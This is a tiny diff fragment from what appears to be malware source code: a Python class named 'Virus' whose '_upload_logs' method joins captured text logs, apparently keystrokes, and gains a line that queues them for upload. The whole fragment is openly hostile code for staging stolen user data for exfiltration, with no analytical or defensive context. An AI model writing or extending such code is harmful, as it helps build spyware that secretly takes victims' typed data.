@@ -133,3 +133,4 @@ class Virus(object):
     def _upload_logs(self):
         if not self.texts: return
         textstr = "".join(self.texts)
+        self.upload_queue.put(textstr)
